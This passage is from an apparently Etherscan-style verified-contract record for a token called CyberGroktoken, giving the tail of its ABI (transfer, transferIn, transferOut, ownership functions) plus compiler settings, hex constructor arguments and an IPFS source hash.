s\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCyberGrokwesite\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tcreditERC\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tcreditERC\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"transferInAddress\",\"type\":\"address\"}],\"name\":\"transferIn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"transferOutAddress\",\"type\":\"address\"}],\"name\":\"transferOut\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CyberGroktoken", "CompilerVersion": "v0.8.23+commit.f704f362", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000002386f26fc100000000000000000000000000000e21689a3819aaf54f2ca5f9b1c083a2692778ad0000000000000000000000000000000000000000000000000000000000000009437962657247726f6b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009437962657247726f6b0000000000000000000000000000000000000000000000", "EVMVersion": "paris", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://9afdaa4ca3bfffb6206a5d11965f5b16ca094bc2e8d6c21a5dd61532c39620da"}